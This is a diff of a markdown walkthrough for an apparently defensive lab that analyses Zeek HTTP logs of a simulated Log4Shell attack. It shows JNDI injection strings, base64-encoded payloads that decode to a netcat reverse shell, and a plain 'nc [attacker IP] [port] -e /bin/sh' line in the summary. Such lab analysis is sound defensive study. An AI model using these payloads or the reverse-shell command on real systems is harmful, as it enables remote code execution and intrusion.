@@ -166,21 +166,14 @@ Ans: ***3***
 
 - `cat http.log | zeek-cut user_agent | sort | uniq `
 - ![image](https://github.com/user-attachments/assets/f3b24cb0-b317-43d1-885d-bc699a462e79)
--`${jndi:ldap://127.0.0.1:1389}` -> these are malicious payload attempting to exploit the *Log4shell* vulnerability by injecting `${jndi:ldap://...}` into `User-Agent` field, hoping a vulnerable server logs them and triggers a remote JNDI lookup which can result in **remote code execution**
-- `127.0.0.1:1389` -> Likely testing locally for vulnerability.
-- `192.168.56.102:389` -> The attacker controls this host and is attempting to force a vulnerable system to connect back and load a malicious Java class.
-- `Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)` -> An Nmap script scan, likely probing web services.
+
 Ans: ***nmap***
 
 ### Q3. Investigate the http.log file. What is the extension of the exploit file?
 
 - `cat http.log | zeek-cut uri | sort | uniq `
 - ![image](https://github.com/user-attachments/assets/42ebf332-42f2-46ee-bfdf-f848340dfff4)
-- Attacker injects `${jndi:ldap://attacker-ip}` into a request (you've seen this in `user_agent`).
-- A vulnerable system logs this input.
-- The system then contacts the attacker’s LDAP server (`192.168.56.102`).
-- The LDAP server responds with a reference to a `.class` file, e.g., `ExploitXXXX.class`.
-- The system downloads and executes it — **Remote Code Execution**.
+
 
 Ans: ***.class***
 
@@ -190,17 +183,21 @@ Ans: ***.class***
 - decode the returned base64-encoded payloads embedded in **log4shell** attack
 - `for b in dG91Y2ggL3RtcC9wd25lZAo= d2hpY2ggbmMgPiAvdG1wL3B3bmVkCg== bmMgMTkyLjE2OC41Ni4xMDIgODAgLWUgL2Jpbi9zaCAtdnZ2Cg==; do echo "$b" | base64 -d; echo; done` 
 - ![image](https://github.com/user-attachments/assets/87f057f9-3f1a-4d5d-8e03-5a6ca0386fc4)
-- Creates a file named `pwned` in `/tmp`
-- Checks if `nc` (Netcat) is installed and saves the output to `/tmp/pwned`
-- Tries to start a reverse shell to the attacker's machine (`192.168.56.102`) on port `80`, executing `/bin/sh`. `-vvv`is for verbose output.
 
 
 Ans: ***pwned***
 
 ## Is it a True Positive?
 
-Yes- This is a clear simulated **Log4Shell exploitation** attempt where:
-1. The attacker uses [JNDI](https://www.veracode.com/blog/research/exploiting-jndi-injections-java/) injection in HTTP headers.
-2. The vulnerable server reaches out to an LDAP server at `192.168.56.102`.
-3. The LDAP server serves Java class exploits.
-4. The server then executes base64-encoded commands, including a reverse shell attempt.
+Yes- This is a clear simulated **Log4Shell exploitation** attempt:
+
+1. **Injection**: The attacker injects a `${jndi:ldap://...}` payload into an HTTP header (like `User-Agent`)
+2. **Callback**: The vulnerable application interprets it and performs a [JNDI](https://www.veracode.com/blog/research/exploiting-jndi-injections-java/) lookup to the attacker's LDAP server.
+3. **Payload Delivery**: The LDAP server responds with a malicious Java class — often a remote loader or exploit code
+4. **Command Execution**: This class contains or triggers Base64-encoded system commands, such as:
+     - `touch /tmp/pwned` (test if it works)
+     -` which nc > /tmp/pwned` (check for Netcat)
+     - `nc [attacker IP] [port] -e /bin/sh` (launch reverse shell)
+
+
+
